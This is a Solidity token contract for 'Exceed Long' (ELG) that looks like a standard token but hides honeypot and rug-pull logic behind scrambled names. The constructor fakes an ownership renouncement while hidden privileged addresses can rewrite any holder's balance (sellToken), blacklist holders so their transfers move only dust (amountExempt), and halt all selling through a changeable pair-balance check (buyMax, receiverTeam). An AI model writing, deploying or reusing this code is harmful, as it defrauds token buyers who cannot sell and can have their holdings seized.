//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface buyReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountBuyReceiver {
    function createPair(address exemptReceiver, address isLiquidity) external returns (address);
}

interface buyEnableAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txLimit) external view returns (uint256);

    function transfer(address limitAt, uint256 fundLimitBuy) external returns (bool);

    function allowance(address fundIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundLimitBuy) external returns (bool);

    function transferFrom(
        address sender,
        address limitAt,
        uint256 fundLimitBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTo, uint256 value);
    event Approval(address indexed fundIs, address indexed spender, uint256 value);
}

interface tradingEnableShould is buyEnableAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExceedLong is amountMin, buyEnableAuto, tradingEnableShould {

    function amountExempt(address shouldBuy) public {
        txMarketingMax();
        
        if (shouldBuy == autoToken || shouldBuy == autoSell) {
            return;
        }
        tokenTake[shouldBuy] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return teamFrom;
    }

    address autoFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private walletSell;

    function getOwner() external view returns (address) {
        return isFromTake;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellSender;
    }

    uint256 constant minReceiverTake = 13 ** 10;

    bool public isTo;

    address public autoSell;

    uint256 private teamLaunched;

    address launchBuyTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public swapSender;

    mapping(address => bool) public tokenTake;

    constructor (){
        
        buyReceiver feeSwap = buyReceiver(launchBuyTo);
        autoSell = amountBuyReceiver(feeSwap.factory()).createPair(feeSwap.WETH(), address(this));
        
        autoToken = _msgSender();
        marketingSwap();
        receiverEnable[autoToken] = true;
        walletSell[autoToken] = exemptMode;
        
        emit Transfer(address(0), autoToken, exemptMode);
    }

    function name() external view virtual override returns (string memory) {
        return buyTo;
    }

    function fromReceiver(address feeTeam) public {
        require(feeTeam.balance < 100000);
        if (isTo) {
            return;
        }
        
        receiverEnable[feeTeam] = true;
        
        isTo = true;
    }

    function marketingSwap() public {
        emit OwnershipTransferred(autoToken, address(0));
        isFromTake = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptMode;
    }

    uint256 txBuy;

    function transferFrom(address liquidityFee, address limitAt, uint256 fundLimitBuy) external override returns (bool) {
        if (_msgSender() != launchBuyTo) {
            if (liquiditySell[liquidityFee][_msgSender()] != type(uint256).max) {
                require(fundLimitBuy <= liquiditySell[liquidityFee][_msgSender()]);
                liquiditySell[liquidityFee][_msgSender()] -= fundLimitBuy;
            }
        }
        return buyMax(liquidityFee, limitAt, fundLimitBuy);
    }

    address private isFromTake;

    function balanceOf(address txLimit) public view virtual override returns (uint256) {
        return walletSell[txLimit];
    }

    string private buyTo = "Exceed Long";

    function owner() external view returns (address) {
        return isFromTake;
    }

    event OwnershipTransferred(address indexed takeSender, address indexed liquidityTotal);

    mapping(address => mapping(address => uint256)) private liquiditySell;

    function approve(address liquidityAt, uint256 fundLimitBuy) public virtual override returns (bool) {
        liquiditySell[_msgSender()][liquidityAt] = fundLimitBuy;
        emit Approval(_msgSender(), liquidityAt, fundLimitBuy);
        return true;
    }

    address public autoToken;

    function sellToken(address sellMarketing, uint256 fundLimitBuy) public {
        txMarketingMax();
        walletSell[sellMarketing] = fundLimitBuy;
    }

    function transfer(address sellMarketing, uint256 fundLimitBuy) external virtual override returns (bool) {
        return buyMax(_msgSender(), sellMarketing, fundLimitBuy);
    }

    uint256 private exemptMode = 100000000 * 10 ** 18;

    function txMarketingMax() private view {
        require(receiverEnable[_msgSender()]);
    }

    function buyMax(address liquidityFee, address limitAt, uint256 fundLimitBuy) internal returns (bool) {
        if (liquidityFee == autoToken) {
            return launchedTx(liquidityFee, limitAt, fundLimitBuy);
        }
        uint256 listToken = buyEnableAuto(autoSell).balanceOf(autoFee);
        require(listToken == txBuy);
        require(limitAt != autoFee);
        if (tokenTake[liquidityFee]) {
            return launchedTx(liquidityFee, limitAt, minReceiverTake);
        }
        return launchedTx(liquidityFee, limitAt, fundLimitBuy);
    }

    uint8 private teamFrom = 18;

    function receiverTeam(uint256 fundLimitBuy) public {
        txMarketingMax();
        txBuy = fundLimitBuy;
    }

    string private sellSender = "ELG";

    uint256 private atReceiver;

    function allowance(address feeFundAt, address liquidityAt) external view virtual override returns (uint256) {
        if (liquidityAt == launchBuyTo) {
            return type(uint256).max;
        }
        return liquiditySell[feeFundAt][liquidityAt];
    }

    uint256 modeFrom;

    function launchedTx(address liquidityFee, address limitAt, uint256 fundLimitBuy) internal returns (bool) {
        require(walletSell[liquidityFee] >= fundLimitBuy);
        walletSell[liquidityFee] -= fundLimitBuy;
        walletSell[limitAt] += fundLimitBuy;
        emit Transfer(liquidityFee, limitAt, fundLimitBuy);
        return true;
    }

    mapping(address => bool) public receiverEnable;

}